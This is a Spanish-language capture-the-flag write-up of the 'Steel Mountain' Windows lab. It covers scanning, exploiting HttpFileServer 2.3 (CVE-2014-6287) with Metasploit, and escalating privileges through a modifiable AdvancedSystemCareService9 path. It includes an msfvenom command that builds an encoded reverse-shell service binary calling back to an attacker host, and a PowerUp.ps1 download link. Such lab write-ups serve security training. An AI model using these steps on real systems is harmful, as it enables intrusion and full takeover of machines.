# STEELMOUNTAIN

# INTRODUCCIÓN

En esta máquina enumeraremos una máquin Windows, ganando acceso con Metasploit, usando powershell para enumerar la maquina y escalar privilegios de administrador.

# ENUMERACIÓN

Test de conectividad

![image](https://github.com/user-attachments/assets/6d7902e8-8f42-4874-a24d-8288f76ca21d)

Escaneo de puertos

![image](https://github.com/user-attachments/assets/cdaf2174-aa04-4135-9227-65927184e657)

Encontramos bastantes puertos abiertos un servidor por el puerto predefinido 80 y otro por el 8080

Parece ser que el puerto 8080 es un servidor HttpFile

![image](https://github.com/user-attachments/assets/199284c8-f896-4686-8f27-0d1bd9cad6a6)

Por el puerto 80 tenemos una página normal y corriente con una imagen de empleado del mes.

![image](https://github.com/user-attachments/assets/b691c09c-6bbe-4b0b-9015-6dbdf49fd470)

Vamos a cogerla y vamos a hacerle estenografía o exiftool a ver si sacamos algo de info

No ha sido ni necesario al descargarla ya nos dice su nombre "Bill Harper"

Posteriormente si nos volvemos al puerto 8080 y vemos que "HttpFileServer 2.3"

Vamos a buscar vulnerabilidades 

![image](https://github.com/user-attachments/assets/04c0164b-5be9-4fe6-a862-2d0734ec85ff)

Encontrada un "Remote Command execution"

Con el CVE-2014-6287

De hecho la máquina nos dice que utilicemos metasploit para ganar una shell lo podemos hacer a sí o generar nosotros mismos una.

Nosotros utilizaremos Metasploit por la sencillez

Simplemente desde metasploit buscamos el CVE con search y posteriormente lo configuramos como otro más.

pillamos la primera flag

![image](https://github.com/user-attachments/assets/d46c9524-2ea4-434e-af20-f2ab009ee033)

![image](https://github.com/user-attachments/assets/3960bd9c-f0a4-4054-a50f-e8e0310007e3)

# ESCALADA DE PRIVILEGIOS

Ahora que tenemos una shell y una cceso, vamos a enumerar la maquina para usar scripts de powershell para elevar privilegios en la máquina widnows.

Podemos descargar el scrip que utilizaremos (https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1)

![image](https://github.com/user-attachments/assets/f4471005-9baa-4b73-be3a-ceedbea28336)

Encontramos el path vulnerable AdvancedSystemCareService9 "Accesschk.exe" 

Este directorio revela que podemos moficiar rutas gracias a este servicio.

Vamos a usar msfvenom para generar una shell reversa

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.143.190 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
```

Creamos un python server o simplemente lo subimos con upload

Nos tenemos que ir al directio C:\Program Files (x86)\IObit\

Una cosa importante es darnos cuentas que el usuario que tenemos podemos parar dicho servicio, 

![image](https://github.com/user-attachments/assets/21ae116c-adff-46e0-aafb-401da2335c38)

Primero de todo deberemos generar la "shell" con shell simplemente

Despúes de todo identificar el servicio "AdvancedSystemCareService9" posteriormente, pararlo hacer y volverlo a ejecutar mientras estamos en escucha por el puerto que anteirormente pusimos en la rev shell

![image](https://github.com/user-attachments/assets/dff3baed-4f34-40ba-ac3e-e5b2354b886b)

![image](https://github.com/user-attachments/assets/2b07ccab-7a36-4f68-9e74-dfcb4fa1725f)

![image](https://github.com/user-attachments/assets/affbbc2d-dd45-4bf0-9f73-9ea79ad737bf)


